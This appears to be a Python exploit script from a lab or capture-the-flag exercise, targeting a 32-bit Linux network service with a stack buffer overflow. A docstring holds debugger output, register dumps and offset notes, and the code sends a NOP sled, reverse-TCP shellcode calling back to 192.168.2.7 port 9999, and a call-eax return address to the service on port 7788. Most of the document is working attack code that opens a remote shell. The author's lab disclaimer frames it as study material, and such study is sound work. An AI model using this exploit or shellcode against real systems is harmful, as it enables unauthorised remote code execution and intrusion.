'''
@Author: Captain Darkshade

Twitter: @cdarkshade
YouTube: Captain Darkshade

Disclaimer: I am not a security professional nor do I consider myself as an expert. 
I am nothing more than a security enthusiast and a beginner at best. Scanning and 
attacking networks and computers without express permission is illegal in many countries. 
Code samples are provided as is and without warranty. All demos conducted in my own isolated lab.

ASLR?
cat /proc/sys/kernel/randomize_va_space
    2

Looks like we have the agent id:
Guessed arguments:
arg[0]: 0xffffd23e ("AAAAAAAA")
arg[1]: 0x804c1d0 ("48093572")
arg[2]: 0x8 

arch     x86
binsz    10654
bintype  elf
bits     32
canary   false
class    ELF32
endian   little
nx       false
os       linux

[----------------------------------registers-----------------------------------]
EAX: 0xffffd184 ('A' <repeats 152 times>, "\204\321\377\377", 'A' <repeats 44 times>...)
EBX: 0x0 
ECX: 0xf7fa9dc7 --> 0xfaa8900a 
EDX: 0xf7faa890 --> 0x0 
ESI: 0xf7fa9000 --> 0x1d5d8c 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd230 ('A' <repeats 128 times>)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)

Is this a 32bit binary[y/N]? y
Enter address of stack pointer: 0xffffd230
Enter buffer start: 0xffffd184  =>  0xfffc7fb4 => 0xff872844 @Random
[$] Buffer Size: 168


python -c "print 'A'*164 + 'BBBB' + 'CCCC'"

eax            0xfffc7fb4	0xfffc7fb4
ecx            0xf7f8cdc7	0xf7f8cdc7
edx            0xf7f8d890	0xf7f8d890
ebx            0x0	0x0
esp            0xfffc8060	0xfffc8060
ebp            0x42424242	0x42424242
esi            0xf7f8c000	0xf7f8c000
edi            0x0	0x0
eip            0x43434343	0x43434343

EAX always points to EBP of our frame in report function -> Atleast I think this is how it is working
0x08048563   # 2: call eax

'''
import socket

buf =  ""

buf += '\x90' * 40 # nop sled probably don't need this but just in case : 168 - 40 = 128

# payload reverse tcp 192.168.2.7 port 9999 : 128 - 68 = 60
buf += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
buf += "\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0"
buf += "\xa8\x02\x07\x68\x02\x00\x27\x0f\x89\xe1\xb0\x66\x50"
buf += "\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73"
buf += "\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0"
buf += "\x0b\xcd\x80"

# fill the rest
buf += '\x90' * 60

buf +=  '\x63\x85\x04\x08'  #0x08048563   # 2: call eax little endian address reverse

# All right here is the magic
s = socket.socket()
s.connect(("192.168.2.8", 7788))
print s.recv(1024)
s.send('48093572' + '\n') # agent id
print s.recv(1024)
s.send('3' + '\n') # option 3 for report 
print s.recv(1024)
s.send(buf + '\n')
print s.recv(1024)
